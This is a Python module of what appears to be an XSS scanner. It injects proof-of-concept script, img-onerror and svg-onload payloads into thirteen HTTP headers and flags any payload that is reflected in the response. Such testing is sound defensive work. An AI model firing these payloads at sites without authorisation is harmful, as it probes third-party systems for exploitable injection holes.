#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Headers Injector
Tests HTTP headers for XSS vulnerabilities
"""

from typing import List, Dict

class HeadersInjector:
    """Test HTTP headers for XSS vulnerabilities"""
    
    INJECTABLE_HEADERS = [
        'User-Agent',
        'Referer',
        'X-Forwarded-For',
        'X-Forwarded-Host',
        'X-Forwarded-Proto',
        'X-Original-URL',
        'X-Rewrite-URL',
        'X-HTTP-Host-Override',
        'X-Forwarded-Port',
        'X-Forwarded-Scheme',
        'X-Frame-Options',
        'Content-Security-Policy',
        'X-XSS-Protection',
    ]
    
    def __init__(self):
        self.payloads = [
            "<script>alert('XSS_Header')</script>",
            "'-alert(1)-'",
            "\"><img src=x onerror=alert('XSS_Header')>",
            "<svg onload=alert('XSS_Header')>",
        ]
    
    async def test(self, url: str, session) -> List[Dict]:
        """Test headers for XSS"""
        vulnerabilities = []
        
        for header in self.INJECTABLE_HEADERS:
            for payload in self.payloads:
                headers = {header: payload}
                
                try:
                    async with session.get(url, headers=headers, ssl=False) as resp:
                        response_text = await resp.text()
                        
                        # Check if header value is reflected
                        if payload in response_text or 'XSS_Header' in response_text:
                            vuln = {
                                'url': url,
                                'parameter': f'HTTP Header: {header}',
                                'payload': payload,
                                'vulnerability_type': 'Header-based XSS',
                                'severity': 'Medium',
                                'context': f'Header {header} reflected in response'
                            }
                            vulnerabilities.append(vuln)
                            break
                            
                except Exception as e:
                    continue
        
        return vulnerabilities
